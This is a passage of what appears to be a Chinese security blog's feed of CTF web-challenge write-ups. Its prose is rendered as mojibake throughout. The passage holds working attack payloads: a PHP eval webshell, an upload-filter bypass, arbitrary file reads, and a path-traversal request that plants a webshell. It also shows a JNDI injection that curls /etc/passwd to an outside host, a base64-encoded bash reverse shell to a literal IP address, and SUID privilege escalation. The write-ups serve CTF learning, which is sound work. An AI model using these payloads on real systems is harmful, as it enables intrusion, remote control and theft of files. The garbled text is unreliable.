title="upload-inc"></a>upload-inc</h2><p>æŸ¥çœ‹æºç ï¼Œæç¤ºinclude.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353475.png" alt="img"></p><p>ç„¶åè®¿é—®include.phpï¼ŒæŸ¥çœ‹æºç ï¼šæç¤ºupload.phpå’Œå‚æ•°ä¸ºfile</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353880.png" alt="img"></p><p>ä¼¼ä¹æ˜¯åŸé¢˜<a href="http://danyhug.gitee.io/blog/2021/01/05/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8-%E7%AD%BE%E5%88%B0%E8%88%AC%E7%9A%84%E5%8C%85%E5%90%AB/">ç¬¬åä¸€å‘¨ | ç­¾åˆ°èˆ¬çš„åŒ…å« | Danyhugâ€™s Blog (gitee.io)</a></p><p>æ•´ä¸€ä¸ª1.phpï¼Œå†™ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œå‹ç¼©ï¼Œå°†å‹ç¼©æ–‡ä»¶åç¼€æ”¹ä¸ºpng</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353108.png" alt="img"></p><p>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353621.png" alt="img"></p><p>ç„¶åèšå‰‘è¿æ¥</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353921.png" alt="image-20220715172645597"></p><h2 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h2><p>æ‰¾åˆ°ç™»å½•ç•Œé¢</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353471.png" alt="img"></p><p>æŒ‰ç…§è¿™ä¸ªåšä¸€éï¼Œå¼±å¯†ç ç™»å½•</p><p><a href="https://blog.csdn.net/qq_48985780/article/details/122236773">typesetter æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2020-25790ï¼‰_xzhomeçš„åšå®¢-CSDNåšå®¢</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353215.png" alt="image-20220715201703774"></p><p>ç„¶åä¸Šä¼ æœ¨é©¬1.zipï¼ŒåŠ å‹ï¼Œç„¶åèšå‰‘ç›´æ¥è¿æ¥</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353087.png" alt="img"></p><p>æ‰¾åˆ°flag.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152354803.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn2022-web-ä¼šèŠå¤©çš„æœºå™¨äºº</title>
      <link href="/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2022/07/14/ciscn2022-web-%E4%BC%9A%E8%81%8A%E5%A4%A9%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2022-åä¸œåŒ—-ä¼šèŠå¤©çš„æœºå™¨äºº"><a href="#CISCN2022-åä¸œåŒ—-ä¼šèŠå¤©çš„æœºå™¨äºº" class="headerlink" title="CISCN2022-åä¸œåŒ—-ä¼šèŠå¤©çš„æœºå™¨äºº"></a>CISCN2022-åä¸œåŒ—-ä¼šèŠå¤©çš„æœºå™¨äºº</h1><p>å¯ä»¥ä¸Šä¼ è¯åº“è§„åˆ™ï¼Œç„¶åå’Œæœºå™¨äººå¯¹è¯ï¼Œå°±ä¼šå»è¿›è¡ŒæŸ¥æ‰¾ï¼Œå¹¶ä¸”å›å¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;ä½ å¥½&quot;</span>: &#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;ä½ å¥½ctferï¼&quot;</span>&#125;, <span class="string">&quot;1&quot;</span>: &#123;<span class="string">&quot;image&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>&#125;, <span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;calc&quot;</span>:<span class="string">&quot;1+1&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„iamgeï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªå›¾ç‰‡çš„é“¾æ¥ï¼Œç„¶åæœºå™¨äººä¼šå»è®¿é—®ï¼Œå¹¶ä¸”è¿”å›ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°è¯•è®¿é—®<code>/etc/passwd</code>ï¼Œè¿›è¡Œbase64è§£ç å°±å¯ä»¥è·å–</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142134821.png" alt="image-20220714192927092"></p><p>æ‰€ä»¥å°è¯•ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯ä¸èƒ½è¯»å–&#x2F;flagï¼Œå¯èƒ½æ˜¯è·¯å¾„é—®é¢˜ï¼Œæˆ–è€…æƒé™é—®é¢˜</p><p>ç»§ç»­çœ‹calcåŠŸèƒ½ï¼Œå°è¯•ä¸€ä¸‹ï¼Œå›æ˜¾<code>adminæ‰èƒ½ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½</code></p><p>è¿˜æ˜¯é‚£ä¸ªè¯»å–æ–‡ä»¶çš„ä¸œè¥¿ï¼Œä½¿ç”¨phpä¼ªåè®®è¯»å–api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=/var/www/html/api.php</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">init</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$sesspath</span> = <span class="string">&quot;/tmp/session&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_save_path</span>(<span class="variable">$sesspath</span>);   <span class="comment">//sessionå­˜æ”¾åœ°å€</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>] = <span class="string">&#x27;ck&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="string">&quot;/tmp/resource&quot;</span>))</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;/tmp/resource&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_dir_exists</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">dir</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$dir</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">read</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_file</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getres</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">log_write</span>(<span class="variable">$input</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/tmp/resource/&quot;</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯·å…ˆä¸Šä¼ è¯åº“æ–‡ä»¶ã€‚&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ck</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>),<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ck</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$key</span>,<span class="variable">$input</span>) <span class="keyword">or</span> <span class="title function_ invoke__">strstr</span>(<span class="variable">$input</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="title function_ invoke__">key</span>(<span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$v</span> = <span class="variable">$value</span>[<span class="variable">$type</span>];</span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$type</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;string&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$v</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;image&quot;</span>:</span><br><span class="line">                    <span class="variable">$b64img</span> = <span class="string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$v</span>)) . <span class="string">&#x27;&quot;/&gt;&#x27;</span>;      <span class="comment">//æ–‡ä»¶è·å–ï¼Œç„¶åä»¥base64å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$b64img</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;calc&quot;</span>:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>])&#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\(|\)|\&#x27;|\&quot;/im&quot;</span>,<span class="variable">$v</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;åŒ…å«éæ³•å­—ç¬¦&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v</span>;&quot;</span>);      <span class="comment">//è¿™ä¸ªåº”è¯¥æ˜¯åˆ©ç”¨ç‚¹ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä½†æ˜¯éœ€è¦$_SESSION[&#x27;is_admin&#x27;]å­˜åœ¨</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;adminæ‰èƒ½ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;è¿™ä¸ªåŠ¨ä½œæš‚æ—¶è¿˜æ²¡èƒ½å®ç°&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;æ²¡æœ‰åŒ¹é…åˆ°è¯åº“æ¶ˆæ¯&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uploadc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uploadc&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cname&#x27;</span>];</span><br><span class="line">    <span class="variable">$resourcedir</span> = <span class="string">&quot;/tmp/resource/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_dir_exists</span>(<span class="variable">$resourcedir</span>))      <span class="comment">//è§„åˆ™å­˜æ”¾åœ°å€</span></span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$resourcedir</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;&lt;&quot;</span>))&#123;  <span class="comment">//å…³é”®è¯è¿‡æ»¤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;åˆ«è¿™æ ·ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>))&#123;      <span class="comment">//å…³é”®è¯è¿‡æ»¤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;åˆ«è¿™æ ·ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;cname&#x27;</span>] = <span class="variable">$filename</span>;     <span class="comment">//å¯¹$_SESSION[&#x27;cname&#x27;]è¿›è¡Œæ›´æ–°</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$resourcedir</span>.<span class="variable">$filename</span>,<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_write</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$logpath</span> = <span class="string">&quot;log.txt&quot;</span>;</span><br><span class="line">    <span class="variable">$oper</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">    <span class="variable">$opername</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$oper</span>,<span class="number">0</span>,<span class="number">1</span>) ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> &lt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$oper</span>);<span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$opername</span> .= <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$logpath</span>,<span class="string">&quot;<span class="subst">$opername</span> : <span class="subst">$msg</span> \n&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getres</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>]);   <span class="comment">//æ ¹æ®è¾“å…¥çš„inputè¿›è¡Œç›¸åº”çš„æ“ä½œ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uploadc&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">uploadc</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;clear&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;log.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ ¹æ®uploadc()è·å–è§„åˆ™çš„å­˜æ”¾åœ°å€</p><p>å°è¯•è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;ä½ å¥½&quot;</span>: &#123;<span class="string">&quot;string&quot;</span>: <span class="string">&quot;ä½ å¥½ctferï¼&quot;</span>&#125;, <span class="string">&quot;1&quot;</span>: &#123;<span class="string">&quot;image&quot;</span>: <span class="string">&quot;/tmp/resource/ck&quot;</span>&#125;, <span class="string">&quot;2&quot;</span>:&#123;<span class="string">&quot;calc&quot;</span>:<span class="string">&quot;1+1&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142134509.png" alt="image-20220714200142039"></p><h3 id="å†™æœ¨é©¬"><a href="#å†™æœ¨é©¬" class="headerlink" title="å†™æœ¨é©¬"></a>å†™æœ¨é©¬</h3><p>é€šè¿‡uploadc()å‡½æ•°å†™æœ¨é©¬</p><p>å°½ç®¡ä½¿ç”¨äº†strposè¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å°†<code>&lt;</code>å’Œ<code>.</code>æ”¾åœ¨å­—ç¬¦ä¸²é¦–ä½å°±å¯ä»¥ä½¿å¾—åˆ¤åˆ«ç»“æœä¸º0ï¼Œä»è€Œè¿›è¡Œç»•è¿‡</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142135740.png" alt="image-20220714211740154"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploadc=%<span class="number">3</span>C%<span class="number">3</span>Fphp+%<span class="number">40</span><span class="keyword">eval</span>(%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E&amp;cname=../.../../../../<span class="keyword">var</span>/www/html/xx.php</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207142135366.png" alt="image-20220714213106213"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ciscn2022 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è“å¸½æ¯2022_Web_ç½‘ç«™å–è¯</title>
      <link href="/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/"/>
      <url>/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="è“å¸½æ¯â€”â€”Web-amp-ç½‘ç«™å–è¯"><a href="#è“å¸½æ¯â€”â€”Web-amp-ç½‘ç«™å–è¯" class="headerlink" title="è“å¸½æ¯â€”â€”Web&amp;ç½‘ç«™å–è¯"></a>è“å¸½æ¯â€”â€”Web&amp;ç½‘ç«™å–è¯</h1><h2 id="Ez-gadget"><a href="#Ez-gadget" class="headerlink" title="Ez_gadget"></a>Ez_gadget</h2><p>&#x2F;jsonè·¯ç”±ä¸‹ï¼Œæœ‰ä¸ªè¿™æ ·çš„åˆ¤æ–­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str != <span class="literal">null</span> &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç‰µæ‰¯åˆ°hashcodeç›¸åŒï¼Œä½†æ˜¯å­—ç¬¦ä¸²ä¸ä¸€æ ·ï¼Œå’Œmd5å¼±ç¢°æ’æœ‰ç‚¹åƒ</p><p>æ‰¾åˆ°è¿™ä¸ªåšå®¢ï¼š<a href="https://blog.csdn.net/weixin_44245828/article/details/109853439">https://blog.csdn.net/weixin_44245828/article/details/109853439</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301787.png" alt="img"></p><p>æ ¹æ®åšå®¢å†…å®¹å°†key:BHUCCIx2zF9mMpJ7è¿›è¡Œè°ƒæ•´ï¼Œè°ƒæ•´ä¸ºBHUBbIx2zF9mMpJ7</p><p>ä¸€ä¸ªå€¼çš„asciiå·®äº†1ï¼Œç„¶åç´§è·Ÿç€å°±æ•´ä¸€ä¸ªasciiå¤§31å­—æ¯çš„è¿›è¡Œ<code>è¡¥å¿</code>ï¼Œå…¶ä½™ä¸å˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;curl http://ip:7010 -Fe=@/etc/passwd&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301244.png" alt="img"></p><p>å‘åŒ…ï¼Œæ³¨æ„ç”¨unicodeç¼–ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=xH8b2iQfPbGejJgs&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://ip:1099/cw3nmu&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•å¤–å¸¦æ–‡ä»¶ï¼Œæµ‹è¯•&#x2F;etc&#x2F;passwd</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0063\u0077\u0033\u006e\u006d\u0075&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301428.png" alt="img"></p><p>åå¼¹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi4yNDAuMTQ4LzcwMTAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> -A <span class="string">&quot;ip&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301502.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str=BHUBbIx2zF9mMpJ7&amp;input=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0078\u0062\u0065\u0061\u006e\u002e\u0070\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006f\u0072\u002e\u004a\u006e\u0064\u0069\u0043\u006f\u006e\u0076\u0065\u0072\u0074\u0065\u0072&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;\u0072\u006d\u0069\u003a\u002f\u002f\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0031\u0030\u0039\u0039\u002f\u0061\u006f\u006a\u0035\u0072\u0068&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>ç›‘å¬7010ç«¯å£ï¼Œåå¼¹shell</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301250.png" alt="img"></p><p>ä½†æ˜¯æƒé™æœ‰é—®é¢˜ï¼Œæ ¹ç›®å½•ä¸‹æ²¡æœ‰flagæ–‡ä»¶ï¼Œæƒ³åˆ°ä¹‹å‰çš„ä¸€ä¸ªææƒå­¦ä¹ </p><p><a href="https://www.it-sec.fail/jerseyctf-2022-mist-root-me/">JerseyCTF 2022 &#x2F; mist â€“ root-me â€“ it-sec.fail</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301512.png" alt="img"></p><p>æ¨¡ä»¿æ‰“ä¸€éå°±å¯ä»¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="built_in">date</span> -f /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122301557.png" alt="img"></p><h2 id="å–è¯"><a href="#å–è¯" class="headerlink" title="å–è¯"></a>å–è¯</h2><p>é¡ºå¸¦å†™ä¸€ä¸‹éƒ¨åˆ†ç½‘ç«™å–è¯éƒ¨åˆ†</p><h3 id="ç½‘ç«™å–è¯1"><a href="#ç½‘ç«™å–è¯1" class="headerlink" title="ç½‘ç«™å–è¯1"></a>ç½‘ç«™å–è¯1</h3><p>vscodeæœç´¢_POSTï¼Œå‘ç°ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122303763.png" alt="img"></p><p>lanmaobei666</p><h3 id="ç½‘ç«™å–è¯2"><a href="#ç½‘ç«™å–è¯2" class="headerlink" title="ç½‘ç«™å–è¯2"></a>ç½‘ç«™å–è¯2</h3><p>åŠ å¯†è§£å¯†å¤„ç†æ—¶ 